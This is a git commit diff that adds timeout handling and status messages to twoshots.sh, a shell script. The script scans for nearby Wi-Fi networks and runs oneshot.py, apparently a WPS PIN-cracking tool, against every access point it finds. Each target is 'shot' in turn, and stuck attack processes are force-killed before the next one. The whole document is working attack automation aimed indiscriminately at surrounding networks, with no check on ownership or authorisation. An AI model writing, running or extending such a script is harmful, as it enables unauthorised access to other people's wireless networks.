55f49dd6e02bd51142b59e404fc49209d79322a9
Bogdan Shchogolev <bogdan993000@gmail.com>
2020-07-03 00:03:28 +0300

    Add debug messages

--- twoshots.sh
+++ twoshots.sh
@@ -1,5 +1,7 @@
 #!/bin/sh
 
+TIMEOUT=30
+
 if [ "$1" ]
 then
 	IFACE=$1
@@ -7,7 +9,7 @@ else
 	IFACE="wlan0"
 fi
 
-echo "Scanning networks around..."
+echo "[*] Scanning networks around..."
 
 TARGETS=$(iw dev $IFACE scan |\
 awk -v iface="$IFACE)" '$3 == iface {MAC = $2;wifi[MAC]["BSSID"] = MAC};\
@@ -17,16 +19,35 @@ sed --expression='s/(on//g')
 
 if [ "$TARGETS" ]
 then
-	echo "Found targets:"
+	echo "[+] Found targets:"
 	echo "$TARGETS"
 else
-	echo "No targets found"
+	echo "[-] No targets found"
 	exit
 fi
 
-TARGETS_BSSIDS=$(echo $TARGETS | awk '{print $1}')
+TARGETS_BSSIDS=$(echo "$TARGETS" | awk '{print $1}')
 
 for TARGET in $TARGETS_BSSIDS
 do
-	python3 oneshot.py --bssid $TARGET -K -F -i $IFACE -w
+	echo
+	echo "[+] Shooting $TARGET"
+	python oneshot.py --bssid $TARGET -K -F -i $IFACE -w || true && killall sleep 2> /dev/null &
+	sleep $TIMEOUT && echo "[-] Timeout!"
+	
+	PIDS="1"
+	while [ "$PIDS" ]
+	do
+		PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
+		for PID in $PIDS
+		do
+			kill -9 $PID 2> /dev/null
+			echo "[*] Killed oneshot process"
+		done
+		sleep 1
+	done
+
+	wait
 done
+
+echo "[*] Jobs done!"
